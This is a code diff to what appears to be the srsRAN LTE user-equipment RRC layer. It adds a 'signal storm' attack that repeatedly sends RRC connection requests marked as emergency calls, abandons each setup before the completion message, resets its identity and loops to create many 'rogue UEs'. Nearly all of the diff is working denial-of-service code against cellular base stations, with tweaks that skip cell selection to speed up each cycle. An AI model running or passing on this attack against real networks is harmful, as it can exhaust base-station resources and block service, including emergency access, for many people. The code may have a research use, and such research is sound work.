@@ -148,6 +148,9 @@ void rrc::init(phy_interface_rrc_lte* phy_,
   t311 = task_sched.get_unique_timer();
   t304 = task_sched.get_unique_timer();
 
+  // !vi - timer initialization for signal storm attack
+  sstorm_unique_timer = task_sched.get_unique_timer();
+
   var_rlf_report.init(task_sched);
 
   transaction_id = 0;
@@ -758,7 +761,16 @@ void rrc::timer_expired(uint32_t timeout_id)
     logger.info("Timer T302 expired. Informing NAS about barrier alleviation");
     nas->set_barring(srsran::barring_t::none);
   } else if (timeout_id == t300.id()) {
-    // Do nothing, handled in connection_request()
+    // !vi - T300 expiry during attack should just restart the cycle
+    if (sstorm_active) {
+      srsran::console("[SSTORM][LTE] T300 expired during attack, restarting cycle...\n");
+      sstorm_consecutive_failures++;
+      state = RRC_STATE_IDLE;
+      stop_all_rrc_timers();
+      set_timer_and_run_attack();
+    } else {
+      // Normal handling - Do nothing, handled in connection_request()
+    }
   } else if (timeout_id == t304.id()) {
     srsran::console("Timer t304 expired: Handover failed\n");
     logger.info("Timer t304 expired: Handover failed");
@@ -2739,7 +2751,38 @@ void rrc::handle_con_setup(const rrc_conn_setup_s& setup)
   t302.stop();
   srsran::console("RRC Connected\n");
 
-  // defer transmission of Setup Complete until PHY reconfiguration has been completed
+  // !vi cache cell info on first successful connection
+  if (!sstorm_cache_cell) {
+    sstorm_cached_pci = meas_cells.serving_cell().get_pci();
+    sstorm_cached_earfcn = meas_cells.serving_cell().get_earfcn();
+    sstorm_cache_cell = true;
+    srsran::console("[SSTORM][LTE][CACHE] PCI: %d, EARFCN: %d\n", sstorm_cached_pci, sstorm_cached_earfcn);
+  }
+
+  if (sstorm_active) {
+    sstorm_rogue_ue_created++;
+    sstorm_consecutive_failures = 0;  // reset on success
+
+    srsran::console("[SSTORM][LTE][PROGRESS] #%d rogue UEs created (and sent)\n", sstorm_rogue_ue_created);
+
+    if (sstorm_rogue_ue_created >= sstorm_max_rogue) {
+      srsran::console("[SSTORM][LTE] %d/%d of rogue UEs completed\n", sstorm_rogue_ue_created, sstorm_max_rogue);
+      sstorm_active = false;
+      return;  // skip MSG5 transmission
+    }
+
+    srsran::console("[SSTORM][LTE] cycle #%d starting without sending MSG5...\n", sstorm_rogue_ue_created + 1);
+
+    // !vi LOCAL RESET - clear the C-RNTI
+    state = RRC_STATE_IDLE;
+    mac->reset();  // RNTI is cleared
+
+    // immediately send another cycle
+    set_timer_and_run_attack();
+    return;  // return without sending MSG5
+  }
+
+  // !vi NORMAL UE OP: defer transmission of Setup Complete until PHY reconfiguration has been completed
   if (not conn_setup_proc.launch(&setup.crit_exts.c1().rrc_conn_setup_r8().rr_cfg_ded, std::move(dedicated_info_nas))) {
     logger.error("Failed to initiate connection setup procedure");
     return;
@@ -3031,6 +3074,149 @@ void rrc::nr_scg_failure_information(const scg_failure_cause_t cause)
   scg_fail_info_nr.crit_exts.c1().scg_fail_info_nr_r15().fail_report_scg_nr_r15.fail_type_r15 =
       (fail_report_scg_nr_r15_s::fail_type_r15_opts::options)cause;
   send_ul_dcch_msg(srb_to_lcid(lte_srb::srb1), ul_dcch_msg);
+}
+
+// !vi THE GEM - LTE Signal Storm attack implementation
+//
+// Attack Entry Point
+void rrc::sstorm_start()
+{
+  srsran::console("[SSTORM][LTE] === SIGNAL STORMING (LTE) ===\n");
+
+  // initialization on first cycle
+  sstorm_active = true;
+  sstorm_cycle_count = 0;
+  sstorm_rogue_ue_created = 0;
+  sstorm_consecutive_failures = 0;
+  sstorm_cache_cell = false;
+  sstorm_cached_pci = 0;
+  sstorm_cached_earfcn = 0;
+
+  if (state == RRC_STATE_CONNECTED) {
+    srsran::console("[SSTORM][LTE] DISCONNECTING...\n");
+    leave_connected();
+    state = RRC_STATE_IDLE;
+
+    srsran::console("[SSTORM][LTE] Starting First Cycle\n");
+    set_timer_and_run_attack();
+  } else if (state == RRC_STATE_IDLE) {
+    srsran::console("[SSTORM][LTE] STARTING ATTACK NOW...\n");
+    set_timer_and_run_attack();
+  } else {
+    srsran::console("[SSTORM][LTE] UNKNOWN STATE, FORCING TO IDLE...\n");
+    leave_connected();
+    state = RRC_STATE_IDLE;
+
+    srsran::console("[SSTORM][LTE] Starting First Cycle\n");
+    set_timer_and_run_attack();
+  }
+}
+
+void rrc::sstorm_unique_timer_expired()
+{
+  if (!sstorm_active) {
+    srsran::console("[SSTORM][LTE] attack stopped\n");
+    return;
+  }
+
+  if (sstorm_rogue_ue_created >= sstorm_max_rogue) {
+    srsran::console("[SSTORM][LTE] Attack Completed: %d Rogues Sent\n", sstorm_rogue_ue_created);
+    return;
+  }
+
+  if (sstorm_consecutive_failures >= sstorm_max_consecutive_failures) {
+    srsran::console("[SSTORM][LTE] max consecutive failures reached, aborting\n");
+    sstorm_active = false;
+    return;
+  }
+
+  sstorm_cycle_count++;
+
+  // connection establishment cause: emergency!
+  srsran::establishment_cause_t cause = srsran::establishment_cause_t::emergency;
+
+  // fast path - if cell is cached and we're in idle
+  if (sstorm_cache_cell && state == RRC_STATE_IDLE && plmn_is_selected) {
+    srsran::console("[FAST-SSTORM][LTE] Cycle %d (SKIPPED CELL SELECTION)\n", sstorm_cycle_count);
+
+    state = RRC_STATE_IDLE;
+    stop_all_rrc_timers();
+    // immediately restart T300
+    t300.run();
+
+    send_con_request(cause);
+    return;
+  }
+
+  // slow path - first time or after failure
+  srsran::console("[SSTORM][LTE] Cycle %d (SLOW PATH - cell selection needed)\n", sstorm_cycle_count);
+
+  // !vi - lighter reset - just stop timers, don't clear PLMN
+  srsran::console("[SSTORM][LTE] Stopping timers...\n");
+  stop_all_rrc_timers();
+
+  // important: recreate procedures if stuck - fixes lots of headaches
+  if (conn_req_proc.is_busy()) {
+    srsran::console("[SSTORM][LTE] Recreating stuck conn_req_proc\n");
+    conn_req_proc.~proc_t<connection_request_proc>();
+    new (&conn_req_proc) proc_t<connection_request_proc>(this);
+    srsran::console("[SSTORM][LTE] After recreation, is_busy() = %d\n", conn_req_proc.is_busy());
+  }
+
+  if (cell_selector.is_busy()) {
+    srsran::console("[SSTORM][LTE] Recreating stuck cell_selector\n");
+    cell_selector.~proc_t<cell_selection_proc, cs_result_t>();
+    new (&cell_selector) proc_t<cell_selection_proc, cs_result_t>(this);
+  }
+
+  if (state != RRC_STATE_IDLE || !plmn_is_selected) {
+    srsran::console("[SSTORM][LTE] Stack Not Ready (state=%d, plmn=%d), Retrying in 1s...\n", state, plmn_is_selected);
+    sstorm_consecutive_failures++;
+    // !vi - use longer delay to allow PLMN selection to complete
+    sstorm_unique_timer.set(1000, [this](uint32_t tid) { sstorm_unique_timer_expired(); });
+    sstorm_unique_timer.run();
+    return;
+  }
+
+  if (conn_req_proc.is_busy()) {
+    srsran::console("[SSTORM][LTE] conn_req_proc still busy after recreation. Retrying in 1s...\n");
+    sstorm_consecutive_failures++;
+    // !vi - use longer delay to avoid tight retry loop
+    sstorm_unique_timer.set(1000, [this](uint32_t tid) { sstorm_unique_timer_expired(); });
+    sstorm_unique_timer.run();
+    return;
+ }
+
+  // finally, send the connection request
+  srsran::console("[SSTORM][LTE] Triggering connection request (cause=%d)\n", (int)cause);
+
+  if (!connection_request(cause, nullptr)) {
+    srsran::console("[SSTORM][LTE] connection_request() Failed. Retrying...\n");
+    sstorm_consecutive_failures++;
+    set_timer_and_run_attack();
+    return;
+  }
+
+  srsran::console("[SSTORM][LTE] Connection Request Sent, waiting for RRC Connection Setup (MSG4)...\n");
+}
+
+// Attack Helper Functions
+//
+// stop all RRC timers
+void rrc::stop_all_rrc_timers()
+{
+  if (t300.is_running()) t300.stop();
+  if (t301.is_running()) t301.stop();
+  if (t302.is_running()) t302.stop();
+  if (t310.is_running()) t310.stop();
+  if (t311.is_running()) t311.stop();
+  if (t304.is_running()) t304.stop();
+}
+
+void rrc::set_timer_and_run_attack()
+{
+  sstorm_unique_timer.set(sstorm_cycle_interval_ms, [this](uint32_t tid) { sstorm_unique_timer_expired(); });
+  sstorm_unique_timer.run();
 }
 
 } // namespace srsue
